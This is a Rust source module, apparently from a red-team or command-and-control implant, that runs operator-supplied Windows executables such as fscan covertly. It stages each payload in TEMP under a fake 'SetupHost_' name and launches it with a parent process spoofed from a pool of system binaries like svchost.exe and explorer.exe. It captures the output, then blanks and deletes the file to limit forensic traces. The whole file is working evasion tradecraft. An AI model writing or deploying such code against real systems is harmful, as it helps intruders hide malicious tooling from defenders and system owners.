//! Isolated execution of native PE payloads (fscan etc.).
//!
//! BOF no longer uses this path — classic BOF runs in-process via the `bof` L2
//! module (see `module_loader::invoke_bof`). The iso_host sacrificial CLR/BOF
//! host has been retired; .NET assemblies are converted to shellcode + inject.
//!
//! What remains: run a native PE (operator-supplied EXE) in a PPID-spoofed
//! short-lived process under a Job Object, capture stdout, then burn the file.
//!
//! ## Disk residual
//!
//! | Artifact | On disk? | Notes |
//! |----------|----------|--------|
//! | native PE payload | Briefly yes | CreateProcess needs a path; burned after job |

use crate::types::CommandResult;
use log::info;
use std::path::PathBuf;

/// Run a native PE (e.g. fscan.exe) in a PPID-spoofed short process.
/// Writes PE to TEMP, CreateProcess with args, captures stdout/stderr, deletes file.
#[cfg(windows)]
pub async fn run_native_isolated(pe: &[u8], args: &str) -> CommandResult {
    match run_native_job(pe, args).await {
        Ok((o, e)) => CommandResult {
            stdout: o,
            stderr: e,
            path: None,
            req_id: None,
        },
        Err(e) => CommandResult {
            stdout: String::new(),
            stderr: format!("isolated native: {e}"),
            path: None,
            req_id: None,
        },
    }
}

#[cfg(not(windows))]
pub async fn run_native_isolated(_pe: &[u8], _args: &str) -> CommandResult {
    CommandResult {
        stdout: String::new(),
        stderr: "isolated native: windows only".into(),
        path: None,
        req_id: None,
    }
}

#[cfg(windows)]
async fn run_native_job(pe: &[u8], args: &str) -> Result<(String, String), String> {
    use crate::module_supervisor::{job_object::JobObject, MAX_OUTPUT_BYTES};

    tokio::task::yield_now().await;
    crate::utils::opsec_heavy_pace_async().await;
    if pe.len() < 64 || pe[0] != b'M' || pe[1] != b'Z' {
        return Err("payload is not a PE (MZ missing)".into());
    }
    if pe.len() > crate::module_supervisor::MAX_PAYLOAD_BYTES {
        return Err("native payload too large".into());
    }

    let path = write_temp_host(pe)?;
    let path_str = path.to_string_lossy().to_string();
    let cmdline = if args.trim().is_empty() {
        format!("\"{}\"", path_str)
    } else {
        format!("\"{}\" {}", path_str, args.trim())
    };
    let parent = pick_parent_image();
    let child = match crate::native::spawn::spawn_spoofed_piped_result(&cmdline, parent) {
        Ok(c) => {
            info!("[iso-native] pid={}", c.pid);
            c
        }
        Err(e) => {
            let _ = std::fs::remove_file(&path);
            return Err(format!("spawn failed: {e}"));
        }
    };
    let job = match JobObject::create() {
        Some(j) => j,
        None => {
            let _ = crate::native::terminate_process_handle(child.h_process);
            close_child_handles(&child);
            burn_disk_path(&Some(path));
            return Err("worker isolation unavailable".into());
        }
    };
    if job.assign_process(child.h_process).is_err() {
        let _ = crate::native::terminate_process_handle(child.h_process);
        close_child_handles(&child);
        burn_disk_path(&Some(path));
        return Err("worker isolation setup failed".into());
    }
    let _ = crate::native::close_handle(child.stdin_write);

    // Bound the read at MAX_OUTPUT_BYTES so we never buffer the full 32 MiB
    // pipe cap before rejecting. Truncation terminates the worker.
    let stdout_read = child.stdout_read;
    let max_out = MAX_OUTPUT_BYTES;
    let reader = std::thread::spawn(move || {
        let buf = crate::native::pipe_read_to_end_bounded(stdout_read, max_out);
        let truncated = buf.len() >= max_out;
        (buf, truncated)
    });
    let wait_ms = 30_000u32;
    if !crate::native::wait_for_single_object_timeout(child.h_process, wait_ms) {
        let _ = job.terminate(1);
        let _ = crate::native::terminate_process_handle(child.h_process);
        let _ = reader.join();
        let _ = crate::native::close_handle(child.h_process);
        burn_disk_path(&Some(path));
        return Err("worker timeout".into());
    }

    let (out_buf, truncated) = reader
        .join()
        .map_err(|_| "worker reader panicked".to_string())?;
    if truncated {
        let _ = job.terminate(1);
        let _ = crate::native::terminate_process_handle(child.h_process);
        let _ = crate::native::close_handle(child.h_process);
        burn_disk_path(&Some(path));
        return Err("worker output too large".into());
    }
    let _ = crate::native::close_handle(child.h_process);
    burn_disk_path(&Some(path));

    let text = {
        #[cfg(feature = "encoding-support")]
        {
            if std::str::from_utf8(&out_buf).is_err() {
                let (cow, _, _) = encoding_rs::GBK.decode(&out_buf);
                cow.into_owned()
            } else {
                String::from_utf8_lossy(&out_buf).into_owned()
            }
        }
        #[cfg(not(feature = "encoding-support"))]
        {
            String::from_utf8_lossy(&out_buf).into_owned()
        }
    };
    Ok((text, String::new()))
}

#[cfg(windows)]
fn close_child_handles(child: &crate::native::spawn::SpoofedPipedChild) {
    let _ = crate::native::close_handle(child.stdin_write);
    let _ = crate::native::close_handle(child.stdout_read);
    let _ = crate::native::close_handle(child.h_process);
}

pub fn burn_disk_path(path: &Option<PathBuf>) {
    if let Some(p) = path {
        let _ = std::fs::write(p, b"");
        let _ = std::fs::remove_file(p);
    }
}

fn pick_parent_image() -> &'static str {
    // Rotate preferred parent; spawn layer still falls back across the pool.
    const POOL: &[&str] = &[
        "RuntimeBroker.exe",
        "sihost.exe",
        "taskhostw.exe",
        "svchost.exe",
        "explorer.exe",
        "dllhost.exe",
    ];
    let i = (crate::utils::next_u32_secure() as usize) % POOL.len();
    POOL[i]
}

/// Public for ModuleSupervisor parent spoof pool.
pub fn pick_parent_for_supervisor() -> &'static str {
    #[cfg(windows)]
    {
        pick_parent_image()
    }
    #[cfg(not(windows))]
    {
        ""
    }
}

/// Brief on-disk stage for a native PE that CreateProcess needs a path for.
fn write_temp_host(pe: &[u8]) -> Result<PathBuf, String> {
    let dir = std::env::temp_dir();
    let name = format!(
        "SetupHost_{:08X}.exe",
        crate::utils::next_u32_secure()
    );
    let path = dir.join(name);
    std::fs::write(&path, pe).map_err(|e| format!("stage host: {e} ({})", path.display()))?;
    Ok(path)
}
